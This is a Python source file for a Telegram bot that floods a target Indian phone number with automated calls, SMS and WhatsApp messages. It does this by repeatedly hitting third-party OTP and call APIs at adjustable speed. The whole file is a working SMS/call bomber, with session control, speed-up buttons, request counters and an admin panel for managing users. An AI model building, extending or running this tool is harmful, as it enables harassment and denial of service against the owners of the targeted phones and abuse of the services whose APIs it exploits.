# main.py
import asyncio
import logging
import time
import re
from datetime import datetime
from typing import Dict, List

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, AIORateLimiter
)
from telegram.constants import ParseMode

from config import *
from database import *

# ------------------------------------------------------------------
# Logging Setup
# ------------------------------------------------------------------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ------------------------------------------------------------------
# Global State (Bombing Session Management)
# ------------------------------------------------------------------
bombing_events: Dict[int, asyncio.Event] = {}
bombing_tasks: Dict[int, List[asyncio.Task]] = {}
user_intervals: Dict[int, Dict[str, int]] = {}
user_mode: Dict[int, str] = {}
request_counts: Dict[int, int] = {}
status_msg_ids: Dict[int, int] = {}

BOMB_MODE_CALL_ONLY = "call"
BOMB_MODE_SMS_ONLY = "sms"
BOMB_MODE_BOTH = "both"

# Admin States (for conversation)
STATE_NONE = 0
STATE_AWAITING_PHONE = 1
STATE_ADMIN_BAN = 10
STATE_ADMIN_UNBAN = 11
STATE_ADMIN_DELETE = 12
STATE_ADMIN_LOOKUP = 13
STATE_ADMIN_ADDADMIN = 14
STATE_ADMIN_REMOVEADMIN = 15
STATE_ADMIN_PROTECT = 16
STATE_ADMIN_UNPROTECT = 17
STATE_ADMIN_BROADCAST = 18
STATE_ADMIN_DM_TARGET = 19
STATE_ADMIN_DM_MESSAGE = 20
STATE_ADMIN_SET_CALL_INTERVAL = 21
STATE_ADMIN_SET_SMS_INTERVAL = 22

# Temporary user data
user_states: Dict[int, int] = {}
user_temp_data: Dict[int, Dict] = {}

# ------------------------------------------------------------------
# Phone Number Cleaning (Smart Feature)
# ------------------------------------------------------------------
def clean_phone_number(text: str) -> str | None:
    """
    Extract 10-digit Indian mobile number from any messy input.
    Examples:
        "+91 98765 43210" -> "9876543210"
        "919876543210"    -> "9876543210"
        "09876543210"     -> "9876543210"
        "9876 543 210"    -> "9876543210"
    """
    if not text:
        return None
    # Extract only digits
    digits = re.sub(r"\D", "", text)

    if len(digits) < 10:
        return None

    # If more than 10 digits, try to extract the Indian number
    if len(digits) > 10:
        # Case 1: Starts with 91 and has 12 digits (91 + 10 digits)
        if digits.startswith("91") and len(digits) == 12:
            return digits[2:]
        # Case 2: Starts with 0 and has 11 digits (0 + 10 digits)
        if digits.startswith("0") and len(digits) == 11:
            return digits[1:]
        # Case 3: Fallback - take last 10 digits
        return digits[-10:]

    return digits

# ------------------------------------------------------------------
# Self-Ping (Keep Render alive 24/7)
# ------------------------------------------------------------------
async def keep_alive():
    await asyncio.sleep(10)
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(RENDER_EXTERNAL_URL) as resp:
                    logger.info(f"Keep-alive ping, status: {resp.status}")
        except Exception as e:
            logger.error(f"Keep-alive failed: {e}")
        await asyncio.sleep(5 * 60)

# ------------------------------------------------------------------
# Async API Hitter
# ------------------------------------------------------------------
async def hit_api(session: aiohttp.ClientSession, api: dict, phone: str) -> bool:
    try:
        url = api["url"].replace("{phone}", phone)
        method = api.get("method", "GET")
        headers = api.get("headers", {}).copy()
        headers.setdefault("User-Agent", "Mozilla/5.0")
        data = api.get("data")
        if data:
            data = data.replace("{phone}", phone)
        timeout = aiohttp.ClientTimeout(total=10)
        if method == "POST":
            async with session.post(url, headers=headers, data=data, timeout=timeout, ssl=False) as resp:
                return resp.status in [200, 201, 202]
        else:
            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                return resp.status in [200, 201, 202]
    except Exception:
        return False

# ------------------------------------------------------------------
# Call Worker (one-by-one every X seconds)
# ------------------------------------------------------------------
async def call_worker(user_id: int, phone: str, stop_event: asyncio.Event, context: ContextTypes.DEFAULT_TYPE):
    idx = 0
    total = len(CALL_APIS)
    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            interval = user_intervals.get(user_id, {}).get("call", DEFAULT_CALL_INTERVAL)
            if user_mode.get(user_id) in (BOMB_MODE_CALL_ONLY, BOMB_MODE_BOTH):
                api = CALL_APIS[idx]
                success = await hit_api(session, api, phone)
                if success:
                    request_counts[user_id] = request_counts.get(user_id, 0) + 1
                idx = (idx + 1) % total
            for _ in range(interval):
                if stop_event.is_set():
                    return
                await asyncio.sleep(1)

# ------------------------------------------------------------------
# SMS/WhatsApp Worker (all at once every X seconds)
# ------------------------------------------------------------------
async def sms_worker(user_id: int, phone: str, stop_event: asyncio.Event, context: ContextTypes.DEFAULT_TYPE):
    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            interval = user_intervals.get(user_id, {}).get("sms", DEFAULT_SMS_INTERVAL)
            if user_mode.get(user_id) in (BOMB_MODE_SMS_ONLY, BOMB_MODE_BOTH):
                tasks = [hit_api(session, api, phone) for api in SMS_WHATSAPP_APIS]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                success_count = sum(1 for r in results if r is True)
                request_counts[user_id] = request_counts.get(user_id, 0) + success_count
            for _ in range(interval):
                if stop_event.is_set():
                    return
                await asyncio.sleep(1)

# ------------------------------------------------------------------
# Start Bombing Session
# ------------------------------------------------------------------
async def start_bombing_session(user_id: int, phone: str, mode: str, context: ContextTypes.DEFAULT_TYPE):
    if user_id in bombing_events:
        return False, "❌ Already bombing!"

    if not (await is_admin(user_id) or await is_owner(user_id)):
        if await is_protected(phone):
            return False, "⚠️ This number is protected and cannot be bombed."

    settings = await get_settings()
    user_intervals[user_id] = {
        "call": settings["call_interval"],
        "sms": settings["sms_interval"]
    }
    user_mode[user_id] = mode
    request_counts[user_id] = 0

    stop_event = asyncio.Event()
    bombing_events[user_id] = stop_event

    tasks = []
    if mode in (BOMB_MODE_CALL_ONLY, BOMB_MODE_BOTH):
        tasks.append(asyncio.create_task(call_worker(user_id, phone, stop_event, context)))
    if mode in (BOMB_MODE_SMS_ONLY, BOMB_MODE_BOTH):
        tasks.append(asyncio.create_task(sms_worker(user_id, phone, stop_event, context)))

    bombing_tasks[user_id] = tasks

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 Stop", callback_data="stop_bombing"),
         InlineKeyboardButton("⚡ Speed Up", callback_data="speed_up"),
         InlineKeyboardButton("🐢 Speed Down", callback_data="speed_down")],
        [InlineKeyboardButton("📊 Stats", callback_data="bombing_stats"),
         InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
    ])
    msg = await context.bot.send_message(
        chat_id=user_id,
        text=(
            f"💣 <b>Bombing Started!</b>\n"
            f"📱 Target: <code>+91{phone}</code>\n"
            f"📞 Call APIs: {len(CALL_APIS)} (interval: {user_intervals[user_id]['call']}s)\n"
            f"💬 SMS/WhatsApp: {len(SMS_WHATSAPP_APIS)} (interval: {user_intervals[user_id]['sms']}s)\n"
            f"🎯 Mode: {mode}"
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=kb
    )
    status_msg_ids[user_id] = msg.message_id
    return True, "✅ Bombing started!"

# ------------------------------------------------------------------
# Stop Bombing
# ------------------------------------------------------------------
async def stop_bombing_session(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    stop_event = bombing_events.pop(user_id, None)
    if stop_event:
        stop_event.set()
    tasks = bombing_tasks.pop(user_id, [])
    for t in tasks:
        t.cancel()
    user_intervals.pop(user_id, None)
    user_mode.pop(user_id, None)
    count = request_counts.pop(user_id, 0)
    msg_id = status_msg_ids.pop(user_id, None)
    if msg_id:
        try:
            await context.bot.edit_message_text(
                chat_id=user_id, message_id=msg_id,
                text=f"🛑 Stopped. Total requests: {count}{BRANDING}",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
    else:
        await context.bot.send_message(chat_id=user_id, text=f"🛑 Stopped. Total requests: {count}")

# ------------------------------------------------------------------
# Adjust Speed
# ------------------------------------------------------------------
async def adjust_speed(user_id: int, increase: bool, context: ContextTypes.DEFAULT_TYPE):
    if user_id not in user_intervals:
        await context.bot.send_message(chat_id=user_id, text="No active session.")
        return
    intervals = user_intervals[user_id]
    if increase:
        intervals["call"] = max(5, intervals["call"] - 2)
        intervals["sms"] = max(2, intervals["sms"] - 1)
        msg = f"⚡ Speed increased. Call: {intervals['call']}s, SMS: {intervals['sms']}s"
    else:
        intervals["call"] = min(60, intervals["call"] + 2)
        intervals["sms"] = min(30, intervals["sms"] + 1)
        msg = f"🐢 Speed decreased. Call: {intervals['call']}s, SMS: {intervals['sms']}s"
    await context.bot.send_message(chat_id=user_id, text=msg)

# ------------------------------------------------------------------
# Send Any Media (Broadcast/DM Helper)
# ------------------------------------------------------------------
async def send_any_message(bot, chat_id: int, update: Update, text: str = None):
    try:
        msg = update.message
        if msg.reply_to_message:
            await bot.copy_message(
                chat_id=chat_id,
                from_chat_id=msg.chat_id,
                message_id=msg.reply_to_message.message_id
            )
            return True
        elif msg.photo:
            await bot.send_photo(chat_id, msg.photo[-1].file_id, caption=msg.caption or "")
            return True
        elif msg.video:
            await bot.send_video(chat_id, msg.video.file_id, caption=msg.caption or "")
            return True
        elif msg.audio:
            await bot.send_audio(chat_id, msg.audio.file_id, caption=msg.caption or "")
            return True
        elif msg.voice:
            await bot.send_voice(chat_id, msg.voice.file_id, caption=msg.caption or "")
            return True
        elif msg.sticker:
            await bot.send_sticker(chat_id, msg.sticker.file_id)
            return True
        elif msg.poll:
            await bot.send_poll(chat_id, question=msg.poll.question, options=[opt.text for opt in msg.poll.options])
            return True
        elif msg.document:
            await bot.send_document(chat_id, msg.document.file_id, caption=msg.caption or "")
            return True
        elif text:
            await bot.send_message(chat_id=chat_id, text=text)
            return True
        else:
            await bot.forward_message(chat_id, msg.chat_id, msg.message_id)
            return True
    except Exception as e:
        logger.error(f"Failed to send message to {chat_id}: {e}")
        return False

# ------------------------------------------------------------------
# Command Handlers
# ------------------------------------------------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await add_user(user.id, user.username, user.first_name)
    kb = [
        [InlineKeyboardButton("💣 Start Bomber", callback_data="choose_mode")],
        [InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")]
    ]
    await update.message.reply_text(
        f"Welcome {user.first_name}! 👋\nChoose an option:",
        reply_markup=InlineKeyboardMarkup(kb)
    )

async def menu_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (await is_admin(user_id) or await is_owner(user_id)):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await show_admin_panel(update.message, user_id)

async def show_admin_panel(target, user_id: int):
    kb = [
        [InlineKeyboardButton("👥 User List", callback_data="admin_users_list")],
        [InlineKeyboardButton("🔍 Lookup User", callback_data="admin_lookup")],
        [InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban"),
         InlineKeyboardButton("🔓 Unban User", callback_data="admin_unban"),
         InlineKeyboardButton("🗑 Delete User", callback_data="admin_delete")],
        [InlineKeyboardButton("➕ Add Admin", callback_data="admin_addadmin"),
         InlineKeyboardButton("➖ Remove Admin", callback_data="admin_removeadmin")],
        [InlineKeyboardButton("🛡️ Protect Number", callback_data="admin_protect"),
         InlineKeyboardButton("🔓 Unprotect", callback_data="admin_unprotect"),
         InlineKeyboardButton("📜 List Protected", callback_data="admin_list_protected")],
        [InlineKeyboardButton("⚙️ Set Intervals", callback_data="admin_set_intervals")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
         InlineKeyboardButton("📨 Direct Message", callback_data="admin_dm")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
    ]
    text = "👑 <b>Admin Panel</b>\nSelect an action:"
    if hasattr(target, 'edit_text'):
        await target.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))
    else:
        await target.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

# ------------------------------------------------------------------
# Callback Handlers
# ------------------------------------------------------------------
async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    kb = [
        [InlineKeyboardButton("💣 Start Bomber", callback_data="choose_mode")],
        [InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")]
    ]
    await query.edit_message_text("Main Menu:", reply_markup=InlineKeyboardMarkup(kb))

async def choose_mode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    kb = [
        [InlineKeyboardButton("📞 Only Call", callback_data="mode_call")],
        [InlineKeyboardButton("💬 Only SMS/WA", callback_data="mode_sms")],
        [InlineKeyboardButton("🔥 Both", callback_data="mode_both")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    await query.edit_message_text("Select bombing mode:", reply_markup=InlineKeyboardMarkup(kb))

async def mode_selected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    mode_map = {
        "mode_call": BOMB_MODE_CALL_ONLY,
        "mode_sms": BOMB_MODE_SMS_ONLY,
        "mode_both": BOMB_MODE_BOTH
    }
    mode = mode_map.get(data, BOMB_MODE_BOTH)
    user_id = query.from_user.id
    user_temp_data[user_id] = {"bomb_mode": mode}
    user_states[user_id] = STATE_AWAITING_PHONE
    await query.edit_message_text(
        "📱 Send 10-digit phone number (without +91):",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")]])
    )

async def stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await stop_bombing_session(query.from_user.id, context)

async def speed_up_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await adjust_speed(query.from_user.id, True, context)

async def speed_down_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await adjust_speed(query.from_user.id, False, context)

async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id not in request_counts:
        await query.edit_message_text("No active session.")
        return
    count = request_counts[user_id]
    intervals = user_intervals.get(user_id, {})
    mode = user_mode.get(user_id, "N/A")
    await query.edit_message_text(
        f"📊 <b>Stats</b>\n"
        f"📱 Total Requests: {count}\n"
        f"🎯 Mode: {mode}\n"
        f"📞 Call Interval: {intervals.get('call', '?')}s\n"
        f"💬 SMS Interval: {intervals.get('sms', '?')}s",
        parse_mode=ParseMode.HTML
    )

async def admin_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not (await is_admin(user_id) or await is_owner(user_id)):
        await query.edit_message_text("⛔ Unauthorized.")
        return
    await show_admin_panel(query, user_id)

# Admin callback functions
async def admin_users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    users = await get_all_users_paginated(0, 15)
    if not users:
        await query.edit_message_text("No users found.")
        return
    text = "👥 <b>User List (Page 1)</b>\n\n"
    for u in users:
        text += f"🆔 {u['user_id']} | @{u.get('username','?')} | {'🔴 Banned' if u.get('banned') else '🟢 Active'}\n"
    kb = [[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]
    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

async def admin_ban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_BAN
    await query.edit_message_text(
        "🚫 Send User ID to ban:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
    )

async def admin_unban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_UNBAN
    await query.edit_message_text(
        "🔓 Send User ID to unban:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
    )

async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_DELETE
    await query.edit_message_text(
        "🗑 Send User ID to delete:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
    )

async def admin_lookup_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_LOOKUP
    await query.edit_message_text(
        "🔍 Send User ID to lookup:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
    )

async def admin_addadmin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_ADDADMIN
    await query.edit_message_text(
        "➕ Send User ID to promote to admin:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
    )

async def admin_removeadmin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_REMOVEADMIN
    await query.edit_message_text(
        "➖ Send User ID to demote from admin:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
    )

async def admin_protect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_PROTECT
    await query.edit_message_text(
        "🛡️ Send 10-digit number to protect:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
    )

async def admin_unprotect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_UNPROTECT
    await query.edit_message_text(
        "🔓 Send 10-digit number to remove protection:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
    )

async def admin_list_protected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    numbers = await get_all_protected_numbers()
    if not numbers:
        text = "No protected numbers."
    else:
        text = "🛡️ <b>Protected Numbers:</b>\n" + "\n".join(f"<code>{n}</code>" for n in numbers)
    await query.edit_message_text(text, parse_mode=ParseMode.HTML,
                                  reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))

async def admin_set_intervals_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    kb = [
        [InlineKeyboardButton("📞 Call Interval", callback_data="set_call_interval")],
        [InlineKeyboardButton("💬 SMS Interval", callback_data="set_sms_interval")],
        [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]
    ]
    await query.edit_message_text("Which interval do you want to change?", reply_markup=InlineKeyboardMarkup(kb))

async def set_call_interval_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_SET_CALL_INTERVAL
    await query.edit_message_text(
        "📞 Send new interval in seconds for Call API:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
    )

async def set_sms_interval_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_SET_SMS_INTERVAL
    await query.edit_message_text(
        "💬 Send new interval in seconds for SMS/WhatsApp API:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
    )

async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_BROADCAST
    await query.edit_message_text(
        "📢 Send the message you want to broadcast (text, photo, video, etc.).\n"
        "You can attach any media by replying.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
    )

async def admin_dm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_states[query.from_user.id] = STATE_ADMIN_DM_TARGET
    await query.edit_message_text(
        "📨 Send User ID to DM:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
    )

# ------------------------------------------------------------------
# Message Handler (User Input and Admin States)
# ------------------------------------------------------------------
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = user_states.get(user_id, STATE_NONE)
    text = update.message.text.strip() if update.message.text else ""

    # Phone input for bombing
    if state == STATE_AWAITING_PHONE:
        cleaned = clean_phone_number(text)
        if not cleaned:
            await update.message.reply_text(
                "❌ <b>Invalid Number Format!</b>\n\n"
                "Please send a valid 10-digit Indian mobile number.\n"
                "<i>Examples: 9876543210, +91 98765 43210, 919876543210</i>",
                parse_mode=ParseMode.HTML
            )
            return

        phone = cleaned

        # Self-bombing check
        user_phone = await get_user_phone(user_id)
        if user_phone == phone:
            await update.message.reply_text("❌ <b>Self-Bombing Blocked!</b>\nYou cannot target your own number.", parse_mode=ParseMode.HTML)
            user_states.pop(user_id, None)
            return

        temp = user_temp_data.get(user_id, {})
        mode = temp.get("bomb_mode", BOMB_MODE_BOTH)
        success, msg = await start_bombing_session(user_id, phone, mode, context)
        await update.message.reply_text(msg)
        user_states.pop(user_id, None)
        user_temp_data.pop(user_id, None)

    # Admin Ban
    elif state == STATE_ADMIN_BAN:
        try:
            target = int(text)
            if await ban_user(target):
                await update.message.reply_text(f"✅ User {target} banned.")
            else:
                await update.message.reply_text("❌ User not found.")
        except:
            await update.message.reply_text("Invalid ID.")
        user_states.pop(user_id, None)

    # Admin Unban
    elif state == STATE_ADMIN_UNBAN:
        try:
            target = int(text)
            if await unban_user(target):
                await update.message.reply_text(f"✅ User {target} unbanned.")
            else:
                await update.message.reply_text("❌ User not found.")
        except:
            await update.message.reply_text("Invalid ID.")
        user_states.pop(user_id, None)

    # Admin Delete
    elif state == STATE_ADMIN_DELETE:
        try:
            target = int(text)
            if await delete_user(target):
                await update.message.reply_text(f"✅ User {target} deleted.")
            else:
                await update.message.reply_text("❌ User not found.")
        except:
            await update.message.reply_text("Invalid ID.")
        user_states.pop(user_id, None)

    # Admin Lookup
    elif state == STATE_ADMIN_LOOKUP:
        try:
            target = int(text)
            u = await get_user_by_id(target)
            if not u:
                await update.message.reply_text("❌ User not found.")
            else:
                info = (
                    f"👤 <b>User {target}</b>\n"
                    f"Name: {u.get('first_name','?')}\n"
                    f"Username: @{u.get('username','?')}\n"
                    f"Role: {u.get('role','user')}\n"
                    f"Banned: {'Yes' if u.get('banned') else 'No'}"
                )
                await update.message.reply_text(info, parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text("Invalid ID.")
        user_states.pop(user_id, None)

    # Admin Add Admin
    elif state == STATE_ADMIN_ADDADMIN:
        try:
            target = int(text)
            await set_admin_role(target, True)
            await update.message.reply_text(f"✅ {target} is now an admin.")
        except:
            await update.message.reply_text("Invalid ID.")
        user_states.pop(user_id, None)

    # Admin Remove Admin
    elif state == STATE_ADMIN_REMOVEADMIN:
        try:
            target = int(text)
            await set_admin_role(target, False)
            await update.message.reply_text(f"✅ {target} is no longer an admin.")
        except:
            await update.message.reply_text("Invalid ID.")
        user_states.pop(user_id, None)

    # Protect Number
    elif state == STATE_ADMIN_PROTECT:
        cleaned = clean_phone_number(text)
        if not cleaned:
            await update.message.reply_text("❌ Invalid number! Send a 10-digit number.")
            return
        phone = cleaned
        if await add_protected_number(phone, user_id):
            await update.message.reply_text(f"✅ {phone} added to protected list.")
        else:
            await update.message.reply_text("⚠️ Number already protected.")
        user_states.pop(user_id, None)

    # Unprotect Number
    elif state == STATE_ADMIN_UNPROTECT:
        cleaned = clean_phone_number(text)
        if not cleaned:
            await update.message.reply_text("❌ Invalid number! Send a 10-digit number.")
            return
        phone = cleaned
        if await remove_protected_number(phone):
            await update.message.reply_text(f"✅ Protection removed for {phone}.")
        else:
            await update.message.reply_text("⚠️ Number not protected.")
        user_states.pop(user_id, None)

    # Set Call Interval
    elif state == STATE_ADMIN_SET_CALL_INTERVAL:
        try:
            sec = int(text)
            if sec < 5 or sec > 120:
                await update.message.reply_text("❌ Must be between 5 and 120 seconds.")
                return
            await update_call_interval(sec)
            await update.message.reply_text(f"✅ Call interval set to {sec} seconds.")
        except:
            await update.message.reply_text("Invalid number.")
        user_states.pop(user_id, None)

    # Set SMS Interval
    elif state == STATE_ADMIN_SET_SMS_INTERVAL:
        try:
            sec = int(text)
            if sec < 2 or sec > 60:
                await update.message.reply_text("❌ Must be between 2 and 60 seconds.")
                return
            await update_sms_interval(sec)
            await update.message.reply_text(f"✅ SMS interval set to {sec} seconds.")
        except:
            await update.message.reply_text("Invalid number.")
        user_states.pop(user_id, None)

    # Broadcast
    elif state == STATE_ADMIN_BROADCAST:
        user_ids = await get_all_user_ids()
        if not user_ids:
            await update.message.reply_text("No users found.")
            user_states.pop(user_id, None)
            return
        status_msg = await update.message.reply_text(f"📢 Sending to {len(user_ids)} users...")
        success = 0
        for uid in user_ids:
            if await send_any_message(context.bot, uid, update, text):
                success += 1
        await status_msg.edit_text(f"✅ Broadcast complete: {success}/{len(user_ids)} delivered.")
        user_states.pop(user_id, None)

    # DM Target
    elif state == STATE_ADMIN_DM_TARGET:
        try:
            target = int(text)
            user_temp_data[user_id] = {"dm_target": target}
            user_states[user_id] = STATE_ADMIN_DM_MESSAGE
            await update.message.reply_text(
                f"✅ Target: {target}\nNow send the message (media allowed).",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
            )
        except:
            await update.message.reply_text("Invalid ID.")
            user_states.pop(user_id, None)

    # DM Send Message
    elif state == STATE_ADMIN_DM_MESSAGE:
        target = user_temp_data.get(user_id, {}).get("dm_target")
        if not target:
            await update.message.reply_text("Something went wrong.")
            user_states.pop(user_id, None)
            return
        if await send_any_message(context.bot, target, update, text):
            await update.message.reply_text(f"✅ Message sent to {target}.")
        else:
            await update.message.reply_text("❌ Failed to send message.")
        user_states.pop(user_id, None)
        user_temp_data.pop(user_id, None)

    # No state
    else:
        await update.message.reply_text("Please use the menu buttons.")

# ------------------------------------------------------------------
# Application Setup and Main Function
# ------------------------------------------------------------------
async def main():
    # Initialize SQLite database
    await init_db()
    logger.info("✅ SQLite database initialized")

    app = Application.builder().token(BOT_TOKEN).rate_limiter(AIORateLimiter()).build()

    # Command Handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", menu_command))
    app.add_handler(CommandHandler("admin", admin_command))

    # Callback Handlers
    app.add_handler(CallbackQueryHandler(main_menu_callback, pattern="^main_menu$"))
    app.add_handler(CallbackQueryHandler(choose_mode_callback, pattern="^choose_mode$"))
    app.add_handler(CallbackQueryHandler(mode_selected_callback, pattern="^mode_(call|sms|both)$"))
    app.add_handler(CallbackQueryHandler(stop_callback, pattern="^stop_bombing$"))
    app.add_handler(CallbackQueryHandler(speed_up_callback, pattern="^speed_up$"))
    app.add_handler(CallbackQueryHandler(speed_down_callback, pattern="^speed_down$"))
    app.add_handler(CallbackQueryHandler(stats_callback, pattern="^bombing_stats$"))
    app.add_handler(CallbackQueryHandler(admin_panel_callback, pattern="^admin_panel$"))
    app.add_handler(CallbackQueryHandler(admin_users_list, pattern="^admin_users_list$"))
    app.add_handler(CallbackQueryHandler(admin_ban_callback, pattern="^admin_ban$"))
    app.add_handler(CallbackQueryHandler(admin_unban_callback, pattern="^admin_unban$"))
    app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
    app.add_handler(CallbackQueryHandler(admin_lookup_callback, pattern="^admin_lookup$"))
    app.add_handler(CallbackQueryHandler(admin_addadmin_callback, pattern="^admin_addadmin$"))
    app.add_handler(CallbackQueryHandler(admin_removeadmin_callback, pattern="^admin_removeadmin$"))
    app.add_handler(CallbackQueryHandler(admin_protect_callback, pattern="^admin_protect$"))
    app.add_handler(CallbackQueryHandler(admin_unprotect_callback, pattern="^admin_unprotect$"))
    app.add_handler(CallbackQueryHandler(admin_list_protected_callback, pattern="^admin_list_protected$"))
    app.add_handler(CallbackQueryHandler(admin_set_intervals_callback, pattern="^admin_set_intervals$"))
    app.add_handler(CallbackQueryHandler(set_call_interval_callback, pattern="^set_call_interval$"))
    app.add_handler(CallbackQueryHandler(set_sms_interval_callback, pattern="^set_sms_interval$"))
    app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
    app.add_handler(CallbackQueryHandler(admin_dm_callback, pattern="^admin_dm$"))

    # Message Handler
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_message))

    # Start self-ping
    asyncio.create_task(keep_alive())

    # Start webhook
    if RENDER_EXTERNAL_URL:
        webhook_url = f"{RENDER_EXTERNAL_URL}/webhook"
        logger.info(f"🚀 Webhook starting on {webhook_url}")
        await app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path="webhook",
            webhook_url=webhook_url
        )
    else:
        logger.error("❌ RENDER_EXTERNAL_URL not set!")
        return

if __name__ == "__main__":
    asyncio.run(main())
